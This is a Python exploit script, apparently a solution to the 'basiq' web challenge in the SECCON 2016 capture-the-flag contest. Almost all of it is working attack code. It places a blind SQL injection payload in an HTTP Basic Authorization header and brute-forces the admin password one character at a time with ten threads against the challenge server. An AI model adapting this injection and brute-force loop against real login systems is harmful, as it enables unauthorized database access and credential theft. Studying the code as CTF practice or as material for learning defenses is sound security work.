#!/usr/bin/env python
#basiq [Web 100] SECCON 2016 Online CTF
#Abdelkader

import base64
import requests
import string
import sys

from multiprocessing.dummy import Pool as ThreadPool


def get_ascii():
    return [
        ord(i) for i in list(
            string.ascii_lowercase +
            string.ascii_uppercase +
            string.digits +
            string.printable
        )
     ]


def find_symbol(pos):
    symbols = get_ascii()
    for i in symbols:
        sys.stdout.write('.')
        query = 'select SUBSTRING((SELECT pass from keiba.☹☺☻ where name="admin" limit 1'
        payload = 'admin:1\' or "{0}"=(select ascii(({1}), {2}, 1)))) -- '.format(i, query, pos + 1)
        headers = {'Authorization': 'Basic {}'.format(base64.b64encode(payload))}
        while True:
            try:
                respond = requests.get('http://basiq.pwn.seccon.jp/admin/admin.cgi', headers=headers)
                break
            except:
                print('Exception')

        if respond.status_code == 200:
            print('\nFOUND... FLAG[{}]: {}\n'.format(pos, chr(i)))
            return
    print('\n{}: {{NOT_FOUND}}\n'.format(pos))


print(''.join([chr(i) for i in get_ascii()]))

indexes = list(range(0, 16))
print(indexes)

pool = ThreadPool(10)
pool.map(find_symbol, indexes)

pool.close()
pool.join()